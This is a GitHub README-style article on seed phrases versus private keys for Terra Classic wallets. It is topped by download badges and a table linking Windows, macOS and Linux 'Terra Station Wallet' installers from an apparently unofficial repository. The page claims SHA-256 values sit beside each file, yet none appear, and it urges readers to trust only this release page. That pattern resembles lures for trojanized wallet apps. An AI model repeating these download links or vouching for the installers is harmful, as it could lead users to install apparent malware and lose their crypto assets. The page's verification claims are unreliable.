![Terra Station Wallet](assets/banner-article.png)

# Seed Phrase vs Private Key: What Each One Restores

<p align="center"><a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-5392F7?style=for-the-badge&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Download for Windows"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-5392F7?style=for-the-badge&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="Download for macOS"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-5392F7?style=for-the-badge&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-5392F7?style=flat-square&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`terra-station-wallet-windows-v2.5.13.exe`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-windows-v2.5.13.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-5392F7?style=flat-square&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="macOS"> | macOS 12 or later | [`terra-station-wallet-macos-v2.5.13.dmg`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-macos-v2.5.13.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-5392F7?style=flat-square&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`terra-station-wallet-linux-v2.5.13.zip`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-linux-v2.5.13.zip) |

</div>

Every file in that table is attached to the [Terra Station Wallet release page](https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13), and the SHA-256 printed beside each name is the value published here.

> **Only download from this GitHub release page.** An installer offered anywhere else, however official it looks, is not a file this project published.

A recovery phrase restores a wallet; a private key restores one account. Both prove ownership, both must be kept offline, and confusing them is how people restore a single account and conclude their other balances are gone. The difference is scope, and scope is decided by how the phrase derives keys.

## The difference in one table

| | Recovery phrase | Private key |
|---|---|---|
| Length | Usually 12 or 24 words | A long string of characters |
| Scope | Every account the wallet derives | A single account |
| Can be re-derived from the other | No | Yes - each account's key comes from the phrase |
| Restores delegations | Yes, at the same address | Yes, for that account only |
| Typical source | Created when the wallet was set up | Exported from a wallet that holds the account |

The asymmetry is the important part: a phrase can produce a key, but a key cannot produce a phrase. That makes the phrase strictly more valuable, and strictly more dangerous to expose.

## Why one phrase covers several accounts

A wallet derives accounts from the phrase using a derivation path, which is a numbered recipe. One phrase plus different paths yields different addresses, which is why a wallet can show several accounts from a single backup.

Whether a restore brings back all of them depends on the wallet doing the restoring. A key import brings back exactly one account, at the address that key controls - nothing more, regardless of what else the original wallet held. https://github.com/terraclassic-wallet/lunc-wallet-recovery/blob/main/terra-station-seed-phrase.md covers the phrase route and *Import a LUNC Wallet with a Private Key* covers the key route.

## When a key is the right tool

- **You only have a key.** Some wallets export keys rather than phrases; that is the material you have, and it restores the account it belongs to.
- **One account needs isolating.** Importing a single key into a separate wallet keeps that account's activity apart from the rest.
- **A phrase restore left an account behind.** If the original wallet held accounts on non-standard paths, the keys may be the only route to them.

A key is never the better tool for a full backup, because it silently drops everything the phrase would have covered.

## Handling both safely

- **Phrase offline, always.** Written on paper or stamped in metal, stored where nobody browses. Never photographed, never in a password manager, never in a note app (https://github.com/terraclassic-wallet/lunc-wallet-recovery/blob/main/store-terra-station-phrase-offline.md).
- **Keys treated as phrases.** An exported key gives full control of its account, so it deserves the same handling - and it is often stored in plain text by people who assume it is less sensitive.
- **One backup per wallet.** Duplicates multiply exposure points; two copies in two safe places is the useful maximum.
- **Verify before relying on it.** Read the backup back and restore it once on a spare device or a fresh install, so you know it works before you need it.
- **Delete the export.** A key exported to a clipboard, screenshot or chat is a key you should consider exposed, and the account moved to a new wallet.

## The trap after an exchange withdrawal

People who withdraw LUNC from an exchange sometimes receive a private key or a phrase for a wallet the exchange created, rather than a transfer to their own address. If that material is a key, it restores one account - usually with the withdrawal in it - and nothing else in the original wallet.

That is not a loss, but it explains a common complaint: a key import showing exactly one balance while the wallet the person thought they had restored stays empty. The phrase is what restores a multi-account wallet.

## Deriving accounts: why paths matter

A phrase does not name accounts directly. It seeds a derivation process, and a path - a short numbered string - selects which account to build from that seed. Change the path and you get a different address from the same phrase.

Most wallets use the same default path, which is why a phrase usually restores the same first account everywhere. Where the original wallet used a different path, a restore can produce an address that holds nothing while the real one sits unbuilt. That is the situation where an exported private key is the practical route to a specific account, and the reason to export them when a wallet offers it.

This is also why a phrase restore that looks empty is not proof of loss: the address may simply not be derived yet. *Account Not Loading in Terra Station Wallet* covers what a partially built wallet looks like while it reads.

## What neither can do

Neither reverses a transaction, recovers a send to a wrong address, or restores a wallet you no longer have material for. Neither is needed by any support process, and no legitimate request for either exists outside your own import screen. https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/is-terra-station-wallet-safe.md covers the patterns that ask for them.

## Questions people ask

### What is a crypto seed phrase?

It is the list of words a wallet generates when it is created, and the wallet turns those words into every private key it uses. That is why the phrase backs up the whole wallet while a key backs up one account - and why a phrase, once exposed, exposes everything it derives.

### Can I get my phrase back from a private key?

No. Derivation runs one way. The key controls its account; the phrase is the only thing that can rebuild the whole wallet.

### Which should I back up?

The phrase, if the wallet gives you one. Keep keys only for accounts you need to restore individually.

### Is a private key less sensitive than a phrase?

No. A key gives full control of its account - the same power a phrase gives over the accounts it derives - so it must never be typed into a website or shared with anyone.

### I restored with a key and only one balance appeared. Is the rest lost?

Not if you still have the phrase. Import the phrase instead and the other accounts return. If the phrase is gone, those accounts are only recoverable through their own keys.

Store the two things differently, too. The phrase belongs offline on paper or metal; a key you exported for one account belongs somewhere you can reach only deliberately, and it should be deleted from clipboards, downloads and chat history the moment the import works. A key left in a screenshot is a key you have effectively published.
